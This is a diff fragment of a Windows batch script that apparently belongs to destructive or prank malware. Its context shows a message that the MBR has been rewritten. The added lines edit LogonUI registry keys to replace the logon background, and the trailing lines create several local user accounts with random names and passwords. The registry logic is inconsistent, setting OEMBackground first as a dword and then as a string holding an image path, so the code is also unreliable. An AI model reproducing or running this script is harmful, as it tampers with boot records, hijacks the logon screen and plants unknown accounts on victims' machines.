@@ -178,6 +178,18 @@ echo The MBR has been rewritten successfully.
 :error
 echo You do not have sufficient privileges or the diskpart utility is not available.
 
+set IMAGE_FILE=C:\Users\User\Desktop\boot_screen.bmp
+set KEY_FILE=C:\Users\User\Desktop\boot_screen_key.reg
+
+reg export HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background %KEY_FILE%
+
+findstr /v "OEMBackground" %KEY_FILE% > %KEY_FILE%.tmp
+echo OEMBackground=dword:00000001 >> %KEY_FILE%.tmp
+move /Y %KEY_FILE%.tmp %KEY_FILE% > nul
+
+reg import %KEY_FILE%
+
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background /v OEMBackground /t REG_SZ /d %IMAGE_FILE% /f
 net user %random% %random% /add
 net user %random% %random% /add
 net user %random% %random% /add
